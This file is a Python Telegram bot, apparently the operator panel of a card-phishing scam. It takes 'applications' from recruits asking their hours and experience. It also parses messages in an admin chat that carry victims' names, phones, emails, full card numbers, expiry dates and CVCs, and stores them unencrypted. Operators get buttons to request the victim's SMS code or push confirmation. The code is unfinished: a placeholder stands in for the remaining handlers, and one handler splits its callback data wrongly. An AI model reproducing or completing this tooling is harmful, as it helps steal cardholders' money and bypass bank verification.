import asyncio
import logging
import os
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
import datetime

# Загружаем переменные из .env
load_dotenv()

# Настройка логирования
logging.basicConfig(level=logging.INFO)

# Берем токен и ID из .env файла
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID')

if not BOT_TOKEN or not ADMIN_CHAT_ID:
    exit(1)

ADMIN_CHAT_ID = int(ADMIN_CHAT_ID)

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

def init_db():
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS applications (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        first_name TEXT,
        time TEXT,
        experience TEXT,
        status TEXT DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS payments (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        first_name TEXT,
        last_name TEXT,
        email TEXT,
        phone TEXT,
        card_number TEXT,
        card_expiry TEXT,
        cvc TEXT,
        amount REAL,
        status TEXT DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    conn.commit()
    conn.close()

init_db()

class ApplicationStates(StatesGroup):
    waiting_for_time = State()
    waiting_for_experience = State()
    confirmation = State()

# Кнопки для бота
main_kb = types.ReplyKeyboardMarkup(
    keyboard=[[types.KeyboardButton(text="📝 Оставить заявку")]],
    resize_keyboard=True
)

accepted_kb = types.ReplyKeyboardMarkup(
    keyboard=[[types.KeyboardButton(text="🏠 Главное меню")]],
    resize_keyboard=True
)

cancel_kb = types.ReplyKeyboardMarkup(
    keyboard=[[types.KeyboardButton(text="❌ Отменить заявку")]],
    resize_keyboard=True
)

confirm_kb = types.ReplyKeyboardMarkup(
    keyboard=[
        [types.KeyboardButton(text="✅ Отправить заявку")],
        [types.KeyboardButton(text="🔄 Заполнить заново")]
    ],
    resize_keyboard=True
)

# Инлайн кнопки для платежей
def get_payment_buttons(payment_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📱 SMS код", callback_data=f"sms_code_{payment_id}"),
            InlineKeyboardButton(text="🔔 Пуш", callback_data=f"push_{payment_id}")
        ],
        [
            InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"wrong_card_{payment_id}")
        ]
    ])

# Инлайн кнопки для заявок
def get_admin_buttons(application_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Принять", callback_data=f"accept_{application_id}"),
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject_{application_id}")
        ]
    ])

# Инлайн кнопки для бота
profile_kb = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")]
])

stats_kb = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="📊 Сегодня", callback_data="stats_today")],
    [InlineKeyboardButton(text="📈 Вчера", callback_data="stats_yesterday")],
    [InlineKeyboardButton(text="📅 Неделя", callback_data="stats_week")],
    [InlineKeyboardButton(text="📆 Месяц", callback_data="stats_month")],
    [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
])

back_kb = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
])

def get_user_status(user_id):
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('SELECT status FROM applications WHERE user_id = ? ORDER BY id DESC LIMIT 1', (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else None

def get_join_date(user_id):
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('SELECT created_at FROM applications WHERE user_id = ? AND status = "accepted"', (user_id,))
    result = cursor.fetchone()
    conn.close()
    if result:
        if isinstance(result[0], str):
            try:
                join_date = datetime.datetime.strptime(result[0], '%Y-%m-%d %H:%M:%S')
                return join_date.strftime('%d.%m.%Y')
            except ValueError:
                return result[0]
        elif isinstance(result[0], datetime.datetime):
            return result[0].strftime('%d.%m.%Y')
    return datetime.datetime.now().strftime('%d.%m.%Y')

def save_payment(user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc):
    try:
        conn = sqlite3.connect('applications.db')
        cursor = conn.cursor()
        cursor.execute('''
        INSERT INTO payments (user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc, amount)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc, 0.0))
        payment_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return payment_id
    except Exception:
        return None

# Обработчик для чата - отправляем новое сообщение с кнопками
@dp.message(F.chat.id == ADMIN_CHAT_ID)
async def handle_chat_messages(message: types.Message):
    message_text = message.text or ""

    # Игнорируем команды и сообщения от бота
    if message_text.startswith('/') or message.from_user.is_bot:
        return

    # Проверяем платежные данные
    if any(keyword in message_text for keyword in ["НОВАЯ ОПЛАТА", "Клиент:", "Карта:", "Номер:", "Срок:", "CVC:"]):
        await process_payment_data(message)

async def process_payment_data(message: types.Message):
    try:
        lines = message.text.split('\n')
        payment_data = {}

        for line in lines:
            line = line.strip()
            if 'Имя:' in line:
                payment_data['first_name'] = line.split('Имя:')[1].strip()
            elif 'Фамилия:' in line:
                payment_data['last_name'] = line.split('Фамилия:')[1].strip()
            elif 'Email:' in line:
                payment_data['email'] = line.split('Email:')[1].strip()
            elif 'Телефон:' in line:
                payment_data['phone'] = line.split('Телефон:')[1].strip()
            elif 'Номер:' in line:
                payment_data['card_number'] = line.split('Номер:')[1].strip()
            elif 'Срок:' in line:
                payment_data['card_expiry'] = line.split('Срок:')[1].strip()
            elif 'CVC:' in line:
                payment_data['cvc'] = line.split('CVC:')[1].strip()

        required_fields = ['first_name', 'last_name', 'email', 'phone', 'card_number', 'card_expiry', 'cvc']
        if any(not payment_data.get(field) for field in required_fields):
            return

        payment_id = save_payment(
            user_id=0,
            first_name=payment_data.get('first_name', ''),
            last_name=payment_data.get('last_name', ''),
            email=payment_data.get('email', ''),
            phone=payment_data.get('phone', ''),
            card_number=payment_data.get('card_number', ''),
            card_expiry=payment_data.get('card_expiry', ''),
            cvc=payment_data.get('cvc', '')
        )

        if payment_id:
            # ОТПРАВЛЯЕМ НОВОЕ СООБЩЕНИЕ с кнопками
            await bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text="💳 <b>Выберите действие:</b>",
                reply_markup=get_payment_buttons(payment_id),
                parse_mode="HTML"
            )

    except Exception:
        pass

# Обработчики инлайн кнопок для платежей
@dp.callback_query(F.data.startswith("sms_code_"))
async def sms_code_handler(callback: types.CallbackQuery):
    payment_id = callback.data.split("_")[2]
    await callback.message.edit_text(
        f"📱 <b>SMS код запрошен для платежа #{payment_id}</b>",
        parse_mode="HTML"
    )
    await callback.answer("SMS код запрошен")

@dp.callback_query(F.data.startswith("push_"))
async def push_handler(callback: types.CallbackQuery):
    payment_id = callback.data.split("_")[2]
    await callback.message.edit_text(
        f"🔔 <b>Пуш уведомление отправлено для платежа #{payment_id}</b>",
        parse_mode="HTML"
    )
    await callback.answer("Пуш отправлен")

@dp.callback_query(F.data.startswith("wrong_card_"))
async def wrong_card_handler(callback: types.CallbackQuery):
    payment_id = callback.data.split("_")[2]
    await callback.message.edit_text(
        f"❌ <b>Карта отклонена для платежа #{payment_id}</b>",
        parse_mode="HTML"
    )
    await callback.answer("Карта отклонена")

# Дальше все остальные хендлеры из предыдущего кода...
# [ВСТАВЬ СЮДА ВСЕ ОСТАЛЬНЫЕ ХЕНДЛЕРЫ ИЗ ПРЕДЫДУЩЕГО КОДА]

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
